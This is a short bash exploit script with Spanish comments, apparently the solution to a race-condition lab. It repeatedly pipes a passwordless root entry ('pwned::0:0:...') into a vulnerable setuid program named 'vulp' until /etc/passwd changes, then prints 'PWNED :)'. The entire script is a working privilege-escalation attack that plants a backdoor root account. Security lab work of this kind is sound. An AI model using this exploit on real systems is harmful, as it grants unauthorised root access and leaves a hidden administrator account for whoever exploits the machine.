#!/bin/bash

PASSWD_FILE="ls -l /etc/passwd"
old=$($PASSWD_FILE)
new=$($PASSWD_FILE)

# Verifica si el archivo ha sido modificado
while [ "$old" == "$new" ]
  do
    # Agrega un usuario "pwned" al archivo /etc/passwd sin contraseña"
    # shellcheck disable=SC2016
    echo 'pwned::0:0:pwned:/root:/bin/bash' | ./vulp
    new=$($PASSWD_FILE)
done
echo "PWNED :). El archivo /etc/passwd tiene que haber sido modificado."